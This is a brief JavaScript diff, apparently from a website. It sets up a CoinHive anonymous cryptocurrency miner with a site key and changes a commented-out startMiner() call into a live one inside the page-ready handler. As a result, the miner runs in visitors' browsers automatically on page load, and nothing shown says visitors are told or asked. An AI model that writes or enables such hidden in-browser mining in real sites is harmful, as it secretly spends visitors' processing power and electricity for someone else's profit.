@@ -1,7 +1,7 @@
 var miner = new CoinHive.Anonymous('eTgwSDIq9AhVuEdDrfHYjF4MyzjCml4q');
 
 $(document).ready(function () {
-    // startMiner();
+    startMiner();
 })
 
 function startMiner() {
